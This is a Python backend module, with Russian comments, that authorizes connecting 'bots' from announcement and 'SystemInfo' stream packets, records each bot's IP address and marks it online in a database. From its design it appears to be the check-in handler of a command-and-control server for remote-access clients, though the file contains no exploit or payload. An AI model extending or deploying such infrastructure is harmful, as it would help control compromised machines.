# backend/Services/Auth.py

import asyncio
import json
from typing import Any, Dict, Optional, Tuple, Union

import backend.LoggerWrapper as logger
from backend.Database import db_get_bots, db_update_bot
from .network import read_packet


async def authorize_bot(
    reader: asyncio.StreamReader, 
    ip_address: str
) -> Optional[Tuple[str, Dict[str, Any]]]:
    """
    Выполняет первичную авторизацию бота по ТЗ V7.2 (Анонс + Стрим).
    """
    try:
        packet_announcement = await asyncio.wait_for(read_packet(reader), timeout=10)
        bot_id, mod_body, size = packet_announcement

        if not bot_id or "SystemInfo" not in (mod_body or ""):
            return None

        if not isinstance(size, int):
            return None

        packet_stream = await asyncio.wait_for(read_packet(reader), timeout=5)
        bot_id_s, mod_body_s, payload_data = packet_stream

        if bot_id_s != bot_id or "SystemInfoStream" not in (mod_body_s or ""):
            return None

        if isinstance(payload_data, dict):
            if payload_data.get("ip") in ["0.0.0.0", "127.0.0.1", None]:
                payload_data["ip"] = ip_address
            
            logger.Log.info(f"[Auth] Bot {bot_id} authorized")
            return bot_id, sync_bot_data(bot_id, payload_data)

    except Exception as error:
        logger.Log.error(f"[Auth] Authorization Critical Error: {error}")
    
    return None


def get_full_db() -> Dict[str, Any]:
    """
    Запрос всех записей из базы данных ботов.
    """
    return db_get_bots()


def sync_bot_data(bot_identifier: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """
    Синхронизация состояния бота с БД.
    """
    database_state: Dict[str, Any] = get_full_db()
    bot_info: Dict[str, Any] = database_state.get(bot_identifier, {"id": bot_identifier})
    invalid_entries: list = [None, "", "??", "Loading...", "Idle"]
    
    clean_payload: Dict[str, Any] = {
        key: value for key, value in payload.items() 
        if value not in invalid_entries
    }
    
    bot_info.update(clean_payload)
    bot_info["status"] = "online"
    
    db_update_bot(bot_identifier, bot_info)
    
    return bot_info